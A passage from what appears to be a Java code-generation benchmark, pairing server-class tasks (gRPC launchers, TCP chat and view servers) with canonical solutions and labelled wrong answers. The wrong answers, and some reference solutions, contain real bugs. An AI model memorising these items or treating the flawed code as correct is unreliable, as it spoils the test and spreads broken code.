delayQueue.poll(3, TimeUnit.SECONDS);\n                        if (delay != null) {\n                            try {\n                                Thread.sleep(delay);\n                            } catch (InterruptedException e) {\n                                Thread.currentThread().interrupt();\n                                throw new RuntimeException(e);\n                            }\n                        }\n                        return next.startCall(call, metadata);\n                    }\n                })\n                .build();\n    }\n\n    public void start() {\n        try {\n            server.start();\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public void stop() {\n        server.shutdown();\n        try {\n            server.awaitTermination();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new RuntimeException(e);\n        }\n    }\n\n    public int port() {\n        return server.getPort();\n    }\n\n    public TraceContextOrSamplingFlags takeRequest() {\n        try {\n            return requests.poll(3, TimeUnit.SECONDS);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new RuntimeException(e);\n        }\n    }\n\n    public void enqueueDelay(long millis) {\n        delayQueue.offer(millis);\n    }\n\n    static class GrpcServerRequest {\n        private final ServerCall call;\n        private final Metadata metadata;\n\n        GrpcServerRequest(ServerCall call, Metadata metadata) {\n            this.call = call;\n            this.metadata = metadata;\n        }\n    }\n}"
  },
  {
    "Task_id": 511,
    "Instruction": "Task Description: Create a Java class that implements a gRPC server launcher for Spring Boot applications, capable of registering multiple gRPC services and managing server lifecycle.\n\nClass Description: The GrpcLauncher class is responsible for starting and managing a gRPC server in a Spring Boot application. It automatically discovers gRPC service beans, configures server parameters, and handles graceful shutdown. The class uses Lombok for logging and Spring's dependency injection.\n\nAttributes:\n- server: [Server] - The gRPC server instance\n- grpcServerPort: [Integer] - The port number for the gRPC server, injected from application properties\n- DEFAULT_MAX_MESSAGE_SIZE: [int] - Constant defining the maximum message size (10MB)\n\nMethods:\n- grpcStart: [grpcStart](Map<String, Object> grpcServiceBeanMap) -> void - Initializes and starts the gRPC server, registering all provided gRPC service beans. Handles server lifecycle and shutdown hooks.\n- grpcStop: [grpcStop]() -> void - Shuts down the gRPC server gracefully when called, typically during application termination.",
    "Canonical_solution": "import io.grpc.BindableService;\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport java.io.IOException;\nimport java.util.Map;\n\n@Slf4j\n@Component(\"grpcLauncher\")\npublic class GrpcLauncher {\n\n    public static final int DEFAULT_MAX_MESSAGE_SIZE = 10 * 1024 * 1024;\n\n    private Server server;\n\n    @Value(\"${server.grpc.port}\")\n    private Integer grpcServerPort;\n\n    public void grpcStart(Map<String, Object> grpcServiceBeanMap) {\n        try {\n            ServerBuilder serverBuilder = ServerBuilder.forPort(grpcServerPort);\n            for (Object bean : grpcServiceBeanMap.values()){\n                serverBuilder.addService((BindableService) bean);\n                log.info(\"{} is register in Spring Boot\", bean.getClass().getSimpleName());\n            }\n            server = serverBuilder\n                .maxInboundMessageSize(DEFAULT_MAX_MESSAGE_SIZE)\n                .maxInboundMetadataSize(DEFAULT_MAX_MESSAGE_SIZE)\n                .build().start();\n            log.info(\"grpc server is started at {}\", grpcServerPort);\n            server.awaitTermination();\n            Runtime.getRuntime().addShutdownHook(new Thread(this::grpcStop));\n        } catch (IOException | InterruptedException e){\n            e.printStackTrace();\n        }\n    }\n\n    private void grpcStop(){\n        if (server != null){\n            server.shutdownNow();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "wrong_result": "@Component\n@Data\n@Slf4j\npublic class GrpcLauncher {\n\n    @Value(\"${grpc.server.port}\")\n    private int grpcServerPort;\n\n    private static final int DEFAULT_MAX_MESSAGE_SIZE = 10 * 1024 * 1024; // 10MB\n\n    private Server server;\n\n    public void grpcStart(Map<String, Object> grpcServiceBeanMap) {\n        ServerBuilder serverBuilder = ServerBuilder.forPort(grpcServerPort)\n            .addTransportListener(new TransportListener() {\n                @Override\n                public void onTransportFailure(TransportFailure transportFailure) {\n                    log.warn(\"Transport failure occurred: {}\", transportFailure.getMessage());\n                }\n            })\n            .maxInboundMessageSize(DEFAULT_MAX_MESSAGE_SIZE);\n\n        for (Map.Entry<String, Object> entry : grpcServiceBeanMap.entrySet()) {\n            String serviceName = entry.getKey();\n            Object service = entry.getValue();\n            if (service instanceof BindableService) {\n                serverBuilder.addService((BindableService) service);\n            } else {\n                log.warn(\"Service {} is not a BindableService\", serviceName);\n            }\n        }\n\n        try {\n            server = serverBuilder.build().start();\n            log.info(\"gRPC server started, listening on port {}\", grpcServerPort);\n        } catch (Exception e) {\n            log.error(\"Failed to start gRPC server\", e);\n            throw new RuntimeException(\"Failed to start gRPC server\", e);\n        }\n\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            if (server != null) {\n                grpcStop();\n            }\n        }));\n    }\n\n    public void grpcStop() {\n        if (server != null) {\n            try {\n                server.shutdown();\n                server.awaitTermination(5, TimeUnit.SECONDS);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n                log.error(\"Server shutdown interrupted\", e);\n            } finally {\n                server = null;\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 512,
    "Instruction": "Task Description: Create a Java class that implements a gRPC server for a simple \"Hello World\" service, following the gRPC framework conventions. The server should handle incoming requests, process them, and send back appropriate responses, while also managing server lifecycle operations.\n\nClass Description: The HelloWorldServer class is a gRPC server implementation that listens on a specified port, handles incoming gRPC requests for a greeting service, and manages server startup and shutdown operations. It includes an inner class that implements the actual gRPC service logic.\n\nAttributes:\n- server: [io.grpc.Server] - The gRPC server instance that handles incoming requests\n- logger: [java.util.logging.Logger] - Logger instance for server status messages\n\nMethods:\n- start() -> [void] - Starts the gRPC server on a predefined port (50051) and registers the Greeter service implementation. Also adds a shutdown hook for graceful termination.\n- stop() -> [void] - Stops the gRPC server if it's running\n- blockUntilShutdown() -> [void] - Blocks the main thread until the server is terminated\n- main(String[] args) -> [void] - Entry point that creates and starts the server instance\n- GreeterImpl.sayHello(HelloRequest req, StreamObserver<HelloReply> responseObserver) -> [void] - Implementation of the gRPC service method that processes HelloRequest and sends HelloReply",
    "Canonical_solution": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.examples.helloworld.GreeterGrpc;\nimport io.grpc.examples.helloworld.HelloReply;\nimport io.grpc.examples.helloworld.HelloRequest;\nimport io.grpc.stub.StreamObserver;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class HelloWorldServer {\n  private static final Logger logger = Logger.getLogger(HelloWorldServer.class.getName());\n\n  private Server server;\n\n  private void start() throws IOException {\n    int port = 50051;\n    server = ServerBuilder.forPort(port).addService(new GreeterImpl()).build().start();\n    logger.info(\"Server started, listening on \" + port);\n    Runtime.getRuntime()\n        .addShutdownHook(\n            new Thread() {\n              @Override\n              public void run() {\n                System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n                HelloWorldServer.this.stop();\n                System.err.println(\"*** server shut down\");\n              }\n            });\n  }\n\n  private void stop() {\n    if (server != null) {\n      server.shutdown();\n    }\n  }\n\n  private void blockUntilShutdown() throws InterruptedException {\n    if (server != null) {\n      server.awaitTermination();\n    }\n  }\n\n  public static void main(String[] args) throws IOException, InterruptedException {\n    final HelloWorldServer server = new HelloWorldServer();\n    server.start();\n    server.blockUntilShutdown();\n  }\n\n  static class GreeterImpl extends GreeterGrpc.GreeterImplBase {\n    @Override\n    public void sayHello(HelloRequest req, StreamObserver<HelloReply> responseObserver) {\n      HelloReply reply = HelloReply.newBuilder().setMessage(\"Hello \" + req.getName()).build();\n      responseObserver.onNext(reply);\n      responseObserver.onCompleted();\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "wrong_result": "public class HelloWorldServer {\n    private Server server;\n    private static final Logger logger = Logger.getLogger(HelloWorldServer.class.getName());\n\n    public void start() {\n        server = ServerBuilder.forPort(50051)\n                .addService(new GreeterImpl())\n                .build()\n                .start();\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            stop();\n        }));\n    }\n\n    public void stop() {\n        if (server != null) {\n            server.shutdown();\n        }\n    }\n\n    public void blockUntilShutdown() throws InterruptedException {\n        if (server != null) {\n            server.awaitTermination();\n        }\n    }\n\n    public static void main(String[] args) {\n        HelloWorldServer server = new HelloWorldServer();\n        server.start();\n        try {\n            server.blockUntilShutdown();\n        } catch (InterruptedException e) {\n            logger.severe(\"Server interrupted: \" + e.getMessage());\n        }\n    }\n\n    private class GreeterImpl extends GreeterGrpc.GreeterBlockingServerImplBase {\n        @Override\n        public void sayHello(HelloRequest req, StreamObserver<HelloReply> responseObserver) {\n            logger.info(\"Received greeting: \" + req.getName());\n            HelloReply reply = HelloReply.newBuilder().setMessage(\"Hello \" + req.getName()).build();\n            responseObserver.onNext(reply);\n            responseObserver.onCompleted();\n        }\n    }\n}"
  },
  {
    "Task_id": 513,
    "Instruction": "Task Description: Create a gRPC server in Java that handles data requests, including synchronous, streaming, and bidirectional streaming operations, with Prometheus monitoring integration.\n\nClass Description: DataHandler is a gRPC server implementation that processes various types of data requests. It includes metrics collection through Prometheus and provides three main service methods for data operations.\n\nAttributes:\n- LOG: [Logger] - Logger instance for server operations logging\n- PORT: [int] - Port number for the gRPC server (1111)\n- syncRequests: [Counter] - Prometheus counter for tracking synchronous requests\n- streamingRequests: [Counter] - Prometheus counter for tracking streaming requests\n- grpcServer: [Server] - gRPC server instance\n- prometheusHttpServer: [HTTPServer] - Prometheus HTTP server for metrics exposure\n\nMethods:\n- start() -> [void] - Initializes and starts the gRPC server with Prometheus monitoring interceptor\n- blockUntilShutdown() -> [void] - Blocks the main thread until server shutdown\n- stop() -> [void] - Gracefully shuts down the gRPC server\n\nNested Class: DataImpl extends DataServiceGrpc.DataServiceImplBase and implements three service methods:\n- get([DataRequest], [StreamObserver<DataResponse>]) -> [void] - Handles synchronous data requests (converts input to uppercase)\n- streamingGet([EmptyRequest], [StreamObserver<DataResponse>]) -> [void] - Streams 10 sequential responses\n- streamingPut([StreamObserver<DataRequest>]) -> [StreamObserver<DataResponse>] - Handles bidirectional streaming (modifies and collects input data)",
    "Canonical_solution": "import colossus.data.Data;\nimport colossus.data.DataServiceGrpc;\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.ServerInterceptors;\nimport io.grpc.stub.StreamObserver;\nimport io.prometheus.client.CollectorRegistry;\nimport io.prometheus.client.Counter;\nimport io.prometheus.client.exporter.HTTPServer;\nimport me.dinowernli.grpc.prometheus.Configuration;\nimport me.dinowernli.grpc.prometheus.MonitoringServerInterceptor;\n\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.logging.Logger;\nimport java.util.stream.IntStream;\n\npublic class DataHandler {\n    private static final Logger LOG = Logger.getLogger(DataHandler.class.getName());\n    private static final int PORT = 1111;\n    private static final Counter syncRequests = Counter.build()\n            .name(\"data_svc_sync_requests\")\n            .help(\"Sync requests to the data service\")\n            .labelNames(\"request_key\")\n            .register();\n\n    private static final Counter streamingRequests = Counter.build()\n            .name(\"data_svc_streaming_requests\")\n            .help(\"Streaming requests to the data service\")\n            .register();\n\n    private Server grpcServer;\n    private static HTTPServer prometheusHttpServer;\n\n    static class DataImpl extends DataServiceGrpc.DataServiceImplBase {\n        private static final Logger LOG = Logger.getLogger(DataImpl.class.getName());\n\n        @Override\n        public void get(Data.DataRequest req, StreamObserver<Data.DataResponse> resObserver) {\n            String request = req.getRequest();\n            LOG.info(String.format(\"Request received for the string: \\\"%s\\\"\", request));\n            String computedValue = request.toUpperCase();\n            LOG.info(String.format(\"Computed value: \\\"%s\\\"\", computedValue));\n            Data.DataResponse res = Data.DataResponse.newBuilder()\n                    .setValue(computedValue)\n                    .build();\n\n            syncRequests.labels(request).inc();\n\n            resObserver.onNext(res);\n            resObserver.onCompleted();\n        }\n\n        @Override\n        public void streamingGet(Data.EmptyRequest req, StreamObserver<Data.DataResponse> resObserver) {\n            LOG.info(\"Request received for streaming data\");\n\n            Data.DataResponse.Builder resBldr = Data.DataResponse.newBuilder();\n\n            IntStream.range(0, 10).forEach(i -> {\n                String value = String.format(\"Response %d\", i);\n\n                streamingRequests.inc();\n\n                resObserver.onNext(resBldr.setValue(value).build());\n            });\n\n            resObserver.onCompleted();\n        }\n\n        @Override\n        public StreamObserver<Data.DataRequest> streamingPut(final StreamObserver<Data.DataResponse> resObserver) {\n            return new StreamObserver<Data.DataRequest>() {\n                private List<String> items = new ArrayList<>();\n\n                @Override\n                public void onNext(Data.DataRequest req) {\n                    items.add(req.getRequest().replace(\"f\", \"9\").toUpperCase());\n                }\n\n                @Override\n                public void onError(Throwable t) {\n                    resObserver.onError(t);\n                }\n\n                @Override\n                public void onCompleted() {\n                    Data.DataResponse res = Data.DataResponse.newBuilder()\n                            .setValue(items.toString())\n                            .build();\n\n                    resObserver.onNext(res);\n                    resObserver.onCompleted();\n                }\n            };\n        }\n    }\n\n    private void start() throws IOException {\n        Configuration monitoringConfig = Configuration.cheapMetricsOnly();\n        MonitoringServerInterceptor prometheusInterceptor = MonitoringServerInterceptor.create(\n            monitoringConfig.withCollectorRegistry(new CollectorRegistry()));\n\n        grpcServer = ServerBuilder.forPort(PORT)\n            .addService(ServerInterceptors.intercept(new DataImpl().bindService(), prometheusInterceptor))\n            .build()\n            .start();\n        LOG.info(String.format(\"gRPC server successfully started on port %d\", PORT));\n    }\n\n    private void blockUntilShutdown() throws InterruptedException {\n        if (grpcServer != null) {\n            grpcServer.awaitTermination();\n        }\n    }\n\n    private void stop() {\n        if (grpcServer != null) grpcServer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "wrong_result": "public class DataHandler {\n    private static final Logger LOG = LoggerFactory.getLogger(DataHandler.class);\n    private static final int PORT = 1111;\n    private final Counter syncRequests = Counter.build().name(\"sync_requests_total\").help(\"Total number of synchronous requests\").register();\n    private final Counter streamingRequests = Counter.build().name(\"streaming_requests_total\").help(\"Total number of streaming requests\").register();\n    private Server grpcServer;\n    private HTTPServer prometheusHttpServer;\n\n    public void start() {\n        try {\n            grpcServer = ServerBuilder.forPort(PORT)\n                    .addService(new DataImpl())\n                    .build()\n                    .start();\n            LOG.info(\"gRPC server started on port {}\", PORT);\n\n            prometheusHttpServer = HTTPServer.create(new InetSocketAddress(9090), 100);\n            LOG.info(\"Prometheus metrics server started on port 9090\");\n        } catch (Exception e) {\n            LOG.error(\"Failed to start server\", e);\n        }\n    }\n\n    public void blockUntilShutdown() {\n        if (grpcServer != null) {\n            grpcServer.awaitTermination();\n        }\n    }\n\n    public void stop() {\n        if (grpcServer != null) {\n            grpcServer.shutdown();\n        }\n        if (prometheusHttpServer != null) {\n            prometheusHttpServer.stop();\n        }\n    }\n\n    private class DataImpl extends DataServiceGrpc.DataServiceImplBase {\n        @Override\n        public void get(DataRequest request, StreamObserver<DataResponse> responseObserver) {\n            syncRequests.inc();\n            String data = request.getData();\n            DataResponse response = DataResponse.newBuilder().setData(data.toUpperCase()).build();\n            responseObserver.onNext(response);\n            responseObserver.onCompleted();\n        }\n\n        @Override\n        public void streamingGet(EmptyRequest request, StreamObserver<DataResponse> responseObserver) {\n            streamingRequests.inc();\n            for (int i = 0; i < 10; i++) {\n                DataResponse response = DataResponse.newBuilder().setData(\"Stream \" + i).build();\n                responseObserver.onNext(response);\n            }\n            responseObserver.onCompleted();\n        }\n\n        @Override\n        public StreamObserver<DataRequest> streamingPut() {\n            streamingRequests.inc();\n            return new StreamObserver<DataRequest>() {\n                @Override\n                public void onNext(DataRequest request) {\n                    String data = request.getData();\n                    DataResponse response = DataResponse.newBuilder().setData(data.toLowerCase()).build();\n                    response.onNext(response);\n                }\n\n                @Override\n                public void onError(Throwable t) {\n                    response.onError(t);\n                }\n\n                @Override\n                public void onCompleted() {\n                    response.onCompleted();\n                }\n            };\n        }\n    }\n}"
  },
  {
    "Task_id": 515,
    "Instruction": "Task Description: Create a Java class that implements a basic TCP server using ServerSocket to handle client connections and communication.\n\nClass Description: The SocketServer class establishes a TCP server that listens for incoming client connections on a specified port, handles communication with connected clients, and properly closes connections when done.\n\nAttributes:\n- serverSocket: [ServerSocket] - The server socket that listens for incoming client connections\n- clientSocket: [Socket] - The socket representing the connected client\n\nMethods:\n- start([int port]) -> [void] - Starts the server on the specified port, waits for client connections, and initiates communication handling\n- handleClientCommunication() -> [void] - Handles the data exchange with the connected client (receives data and sends response)\n- closeConnections() -> [void] - Closes both client and server sockets to release resources",
    "Canonical_solution": "import java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class SocketServer {\n\n    private ServerSocket serverSocket;\n    private Socket clientSocket;\n\n    public void start(int port) throws Exception {\n        serverSocket = new ServerSocket(port);\n        System.out.println(\"Server started, waiting for connections...\");\n        \n        clientSocket = serverSocket.accept();\n        System.out.println(\"Client connected\");\n        \n        handleClientCommunication();\n    }\n\n    private void handleClientCommunication() throws Exception {\n        try {\n            // Read from client\n            byte[] buffer = new byte[1024];\n            int len;\n            StringBuilder sb = new StringBuilder();\n            clientSocket.setSoTimeout(2000);\n            \n            while ((len = clientSocket.getInputStream().read(buffer)) != -1) {\n                sb.append(new String(buffer, 0, len));\n            }\n            System.out.println(\"From client: \" + sb);\n\n            // Write to client\n            String response = \"Hi I'm server\\r\\n\";\n            clientSocket.getOutputStream().write(response.getBytes());\n        } finally {\n            closeConnections();\n        }\n    }\n\n    private void closeConnections() throws Exception {\n        if (clientSocket != null) {\n            clientSocket.close();\n        }\n        if (serverSocket != null) {\n            serverSocket.close();\n        }\n        System.out.println(\"Connections closed\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class SocketServer {\n    private ServerSocket serverSocket;\n    private Socket clientSocket;\n\n    public void start(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n        clientSocket = serverSocket.accept();\n        handleClientCommunication();\n        closeConnections();\n    }\n\n    public void handleClientCommunication() throws IOException {\n        BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n        PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n        String inputLine;\n        while ((inputLine = in.readLine()) != null) {\n            out.println(\"Server received: \" + inputLine);\n        }\n    }\n\n    public void closeConnections() throws IOException {\n        if (clientSocket != null) {\n            clientSocket.close();\n        }\n        if (serverSocket != null) {\n            serverSocket.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 516,
    "Instruction": "Task Description: Implement a TCP server class that handles multiple client connections simultaneously, providing predefined chat responses to incoming messages.\n\nClass Description: TCPServer is a Java class that creates a TCP server listening on a specified port. It maintains a set of predefined messages and can handle multiple client connections concurrently, responding with random messages from its predefined set. The server can be started and stopped as needed.\n\nAttributes:\n- mIsServiceDestoryed: boolean - Flag indicating whether the server should stop running\n- mDefinedMessages: String[] - Array of predefined messages to send to clients\n\nMethods:\n- startServer() -> void - Starts the TCP server in a new thread\n- stopServer() -> void - Stops the TCP server by setting the termination flag\n- TcpServer (inner class) run() -> void - Main server loop that accepts client connections (implements Runnable)\n- responseClient(Socket client) -> void - Handles communication with an individual client\n  - Input: client: Socket - The client socket connection\n  - Output: (none) - Sends responses to client through the socket",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Random;\n\npublic class TCPServer {\n\n    private boolean mIsServiceDestoryed = false;\n    private String[] mDefinedMessages = new String[] {\n            \"\u4f60\u597d\u554a\uff0c\u54c8\u54c8\",\n            \"\u8bf7\u95ee\u4f60\u53eb\u4ec0\u4e48\u540d\u5b57\u5440\uff1f\",\n            \"\u4eca\u5929\u5317\u4eac\u5929\u6c14\u4e0d\u9519\u554a\uff0cshy\",\n            \"\u4f60\u77e5\u9053\u5417\uff1f\u6211\u53ef\u662f\u53ef\u4ee5\u548c\u591a\u4e2a\u4eba\u540c\u65f6\u804a\u5929\u7684\u54e6\",\n            \"\u7ed9\u4f60\u8bb2\u4e2a\u7b11\u8bdd\u5427\uff1a\u636e\u8bf4\u7231\u7b11\u7684\u4eba\u8fd0\u6c14\u4e0d\u4f1a\u592a\u5dee\uff0c\u4e0d\u77e5\u9053\u771f\u5047\u3002\"\n    };\n\n    public void startServer() {\n        new Thread(new TcpServer()).start();\n    }\n\n    public void stopServer() {\n        mIsServiceDestoryed = true;\n    }\n\n    private class TcpServer implements Runnable {\n        @Override\n        public void run() {\n            ServerSocket serverSocket = null;\n            try {\n                serverSocket = new ServerSocket(8688);\n            } catch (IOException e) {\n                System.err.println(\"establish tcp server failed, port:8688\");\n                e.printStackTrace();\n                return;\n            }\n\n            while (!mIsServiceDestoryed) {\n                try {\n                    final Socket client = serverSocket.accept();\n                    System.out.println(\"accept\");\n                    new Thread() {\n                        @Override\n                        public void run() {\n                            try {\n                                responseClient(client);\n                            } catch (IOException e) {\n                                e.printStackTrace();\n                            }\n                        };\n                    }.start();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private void responseClient(Socket client) throws IOException {\n        BufferedReader in = new BufferedReader(new InputStreamReader(\n                client.getInputStream()));\n        PrintWriter out = new PrintWriter(new BufferedWriter(\n                new OutputStreamWriter(client.getOutputStream())), true);\n        out.println(\"\u6b22\u8fce\u6765\u5230\u804a\u5929\u5ba4\uff01\");\n        while (!mIsServiceDestoryed) {\n            String str = in.readLine();\n            System.out.println(\"msg from client:\" + str);\n            if (str == null) {\n                break;\n            }\n            int i = new Random().nextInt(mDefinedMessages.length);\n            String msg = mDefinedMessages[i];\n            out.println(msg);\n            System.out.println(\"send :\" + msg);\n        }\n        System.out.println(\"client quit.\");\n        out.close();\n        in.close();\n        client.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class TCPServer {\n    private boolean mIsServiceDestroyed = false;\n    private String[] mDefinedMessages;\n    private int mPort;\n\n    public TCPServer(String[] messages, int port) {\n        mDefinedMessages = messages;\n        mPort = port;\n    }\n\n    public void startServer() {\n        new Thread(new TcpServer()).start();\n    }\n\n    public void stopServer() {\n        mIsServiceDestroyed = true;\n    }\n\n    private class TcpServer implements Runnable {\n        public void run() {\n            try (ServerSocket serverSocket = new ServerSocket(mPort)) {\n                while (!mIsServiceDestroyed) {\n                    Socket clientSocket = serverSocket.accept();\n                    new Thread(() -> responseClient(clientSocket)).start();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void responseClient(Socket client) {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));\n            PrintWriter out = new PrintWriter(client.getOutputStream(), true);\n\n            String clientMessage;\n            while ((clientMessage = in.readLine()) != null) {\n                String response = getRandomMessage();\n                out.println(response);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private String getRandomMessage() {\n        Random rand = new Random();\n        return mDefinedMessages[rand.nextInt(mDefinedMessages.length)];\n    }\n}"
  },
  {
    "Task_id": 517,
    "Instruction": "Task Description: Create a TCP server class that listens for incoming client connections, processes client requests, and sends responses back using a thread pool for handling multiple concurrent connections.\n\nClass Description: The ViewServer class implements a TCP server that listens on a specified port, accepts client connections, and handles each connection in a separate worker thread using a fixed-size thread pool. The server can send data to connected clients and process incoming requests.\n\nAttributes:\n- mServer: ServerSocket - The server socket that listens for incoming connections  \n- mPort: int - The port number on which the server listens  \n- mThread: Thread - The thread in which the server runs  \n- mThreadPool: ExecutorService - The thread pool for handling client connections  \n\nMethods:\n- start() -> boolean - Starts the server thread and initializes the thread pool. Returns true if successful, false if already running  \n- run() - The main server loop that accepts incoming connections and delegates them to worker threads  \n- writeValue(Socket client, String value) -> boolean - Writes a string value to the specified client socket. Returns true if successful, false otherwise  \n- ViewServerWorker(Socket client) - Constructor for the inner worker class that handles individual client connections  \n- ViewServerWorker.run() - Processes an individual client connection, reading requests and sending responses  \n\nInner Class:\nViewServerWorker - Handles individual client connections with these methods:\n- run() - Reads client input, processes the request, and manages connection cleanup",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class ViewServer implements Runnable {\n    private static final int VIEW_SERVER_DEFAULT_PORT = 4939;\n    private static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n    \n    private ServerSocket mServer;\n    private final int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    private ViewServer(int port) {\n        mPort = port;\n    }\n\n    public boolean start() throws IOException {\n        if (mThread != null) {\n            return false;\n        }\n\n        mThread = new Thread(this, \"Local View Server [port=\" + mPort + \"]\");\n        mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n        mThread.start();\n\n        return true;\n    }\n\n    public void run() {\n        try {\n            mServer = new ServerSocket(mPort, VIEW_SERVER_MAX_CONNECTIONS, InetAddress.getLocalHost());\n        } catch (Exception e) {\n            Log.w(LOG_TAG, \"Starting ServerSocket error: \", e);\n        }\n\n        while (mServer != null && Thread.currentThread() == mThread) {\n            try {\n                Socket client = mServer.accept();\n                if (mThreadPool != null) {\n                    mThreadPool.submit(new ViewServerWorker(client));\n                } else {\n                    try {\n                        client.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            } catch (Exception e) {\n                Log.w(LOG_TAG, \"Connection error: \", e);\n            }\n        }\n    }\n\n    private static boolean writeValue(Socket client, String value) {\n        boolean result;\n        BufferedWriter out = null;\n        try {\n            OutputStream clientStream = client.getOutputStream();\n            out = new BufferedWriter(new OutputStreamWriter(clientStream), 8 * 1024);\n            out.write(value);\n            out.write(\"\\n\");\n            out.flush();\n            result = true;\n        } catch (Exception e) {\n            result = false;\n        } finally {\n            if (out != null) {\n                try {\n                    out.close();\n                } catch (IOException e) {\n                    result = false;\n                }\n            }\n        }\n        return result;\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket mClient;\n\n        public ViewServerWorker(Socket client) {\n            mClient = client;\n        }\n\n        public void run() {\n            BufferedReader in = null;\n            try {\n                in = new BufferedReader(new InputStreamReader(mClient.getInputStream()), 1024);\n                final String request = in.readLine();\n\n                // Process client request and send response\n                // ... (omitted for brevity)\n\n            } catch(IOException e) {\n                Log.w(LOG_TAG, \"Connection error: \", e);\n            } finally {\n                if (in != null) {\n                    try {\n                        in.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n                if (mClient != null) {\n                    try {\n                        mClient.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class ViewServer {\n    private ServerSocket mServer;\n    private int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n    private boolean mRunning;\n\n    public ViewServer(int port) {\n        mPort = port;\n    }\n\n    public boolean start() {\n        if (mRunning) return false;\n        try {\n            mServer = new ServerSocket(mPort);\n            mThreadPool = Executors.newFixedThreadPool(10);\n            mThread = new Thread(this);\n            mThread.start();\n            mRunning = true;\n            return true;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public void run() {\n        while (mRunning) {\n            try {\n                Socket client = mServer.accept();\n                mThreadPool.execute(new ViewServerWorker(client));\n            } catch (IOException e) {\n                e.printStackTrace();\n                if (mRunning) {\n                    break;\n                }\n            }\n        }\n    }\n\n    public boolean writeValue(Socket client, String value) {\n        try {\n            OutputStream out = client.getOutputStream();\n            out.write(value.getBytes());\n            out.flush();\n            return true;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket client;\n\n        public ViewServerWorker(Socket client) {\n            this.client = client;\n        }\n\n        public void run() {\n            try {\n                BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));\n                PrintWriter out = new PrintWriter(client.getOutputStream(), true);\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    out.println(\"Received: \" + inputLine);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    if (client != null) client.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 518,
    "Instruction": "Task Description: Create a Java class that implements a TCP server for unicast communication, handling client connections and data exchange with configurable parameters for testing purposes.\n\nClass Description: UnicastTestTcpRpc is a TCP server implementation that listens for incoming client connections, processes requests, and manages data transmission with configurable buffer sizes and communication modes (synchronous/asynchronous).\n\nAttributes:\n- srv_sock: [ServerSocket] - The server socket listening for incoming connections\n- sock: [Socket] - The active client connection socket\n- sock_in: [DataInputStream] - Input stream for reading data from the client\n- sock_out: [DataOutputStream] - Output stream for writing data to the client\n\nMethods:\n- init(long, boolean, boolean, boolean, boolean, String, int, int) -> [void] - Initializes the server with configuration parameters and starts the acceptor thread\n  Parameters:\n    - sleep_time: [long] - Sleep time between operations\n    - exit_on_end: [boolean] - Whether to exit after processing\n    - busy_sleep: [boolean] - Use busy waiting instead of sleep\n    - sync: [boolean] - Use synchronous communication\n    - oob: [boolean] - Use out-of-band data\n    - addr: [String] - Address to connect to\n    - local_port: [int] - Local port to listen on\n    - dest_port: [int] - Destination port for connections\n\n- createSocket() -> [void] - Creates a new client socket connection if none exists\n- handleRequest(DataInputStream, DataOutputStream) 